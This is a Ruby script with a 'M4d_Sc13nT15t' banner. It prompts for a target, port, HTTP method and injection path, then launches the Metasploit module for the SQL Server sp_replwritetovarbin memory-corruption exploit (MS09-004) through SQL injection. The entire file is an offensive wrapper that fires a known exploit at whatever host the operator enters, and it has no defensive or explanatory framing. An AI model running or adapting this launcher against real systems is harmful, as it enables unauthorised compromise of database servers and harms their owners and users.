require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
         SQL Server sp_replwritetovarbin
         Memory Corruption via SQL Inject
""".red
puts """
	 1st Try {set RPORT 80; 2nd RPORT 8080}""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] Will you use GET or POST ? ".blue
print " [!] ---> ".yellow
method = gets.chomp


puts " [?] What is the the complete path with [SQLi] indicating the injection ? ".blue
print " [!] ---> ".yellow
path = gets.chomp







exec("msfconsole -x 'use exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set METHOD #{method}' -x 'set GET_PATH #{path}' -x 'run'")

